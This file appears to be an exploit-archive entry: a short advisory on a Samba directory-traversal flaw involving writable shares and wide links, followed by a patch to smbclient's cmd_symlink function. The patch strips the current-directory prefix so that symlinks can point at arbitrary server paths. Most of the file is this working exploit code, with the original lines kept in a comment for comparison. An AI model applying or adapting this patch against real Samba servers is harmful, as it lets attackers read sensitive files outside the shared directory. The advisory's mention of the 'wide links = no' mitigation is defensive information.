@@ -1,0 +1,83 @@
+source: http://www.securityfocus.com/bid/38111/info
+ 
+Samba is prone to a directory-traversal vulnerability because the application fails to sufficiently sanitize user-supplied input.
+ 
+Exploits would allow an attacker to access files outside of the Samba user's root directory to obtain sensitive information and perform other attacks.
+ 
+To exploit this issue, attackers require authenticated access to a writable share. Note that this issue may be exploited through a writable share accessible by guest accounts.
+ 
+NOTE: The vendor stated that this issue stems from an insecure default configuration. The Samba team advises administrators to set 'wide links = no' in the '[global]' section of 'smb.conf'.
+ 
+smbclient patch (exploit):
+
+samba-3.4.5/source3/client/client.c
+/****************************************************************************
+ UNIX symlink.
+****************************************************************************/
+
+static int cmd_symlink(void)
+{
+        TALLOC_CTX *ctx = talloc_tos();
+        char *oldname = NULL;
+        char *newname = NULL;
+        char *buf = NULL;
+        char *buf2 = NULL;
+        char *targetname = NULL;
+        struct cli_state *targetcli;
+
+        if (!next_token_talloc(ctx, &cmd_ptr,&buf,NULL) ||
+            !next_token_talloc(ctx, &cmd_ptr,&buf2,NULL)) {
+                d_printf("symlink <oldname> <newname>\n");
+                return 1;
+        }
+        oldname = talloc_asprintf(ctx,
+                        "%s", // << HERE modified
+                        buf);
+        if (!oldname) {
+                return 1;
+        }
+        newname = talloc_asprintf(ctx,
+                        "%s", // << HERE modified
+                        buf2);
+        if (!newname) {
+                return 1;
+        }
+/* ORIGINAL SMBCLIENT SOURCE LINES TO BE MODIFIED (SEE ABOVE).
+      oldname = talloc_asprintf(ctx,
+                        "%s%s", // < modified (see above)
+                        client_get_cur_dir(), // < removed (see above)
+                        buf);
+        if (!oldname) {
+                return 1;
+        }
+        newname = talloc_asprintf(ctx,
+                        "%s%s", // < modified (see above)
+                        client_get_cur_dir(), // < removed (see above)
+                        buf2);
+        if (!newname) {
+                return 1;
+        }
+----------------------------------------------*/
+
+        if (!cli_resolve_path(ctx, "", auth_info, cli, oldname, &targetcli, &targetname)) {
+                d_printf("link %s: %s\n", oldname, cli_errstr(cli));
+                return 1;
+
+        }
+
+        if (!SERVER_HAS_UNIX_CIFS(targetcli)) {
+                d_printf("Server doesn't support UNIX CIFS calls.\n");
+                return 1;
+        }
+
+        if (!cli_unix_symlink(targetcli, targetname, newname)) {
+                d_printf("%s symlinking files (%s -> %s)\n",
+                        cli_errstr(targetcli), newname, targetname);
+                return 1;
+        }
+
+        return 0;
+}
+
+// Cheers,
+// kcope 
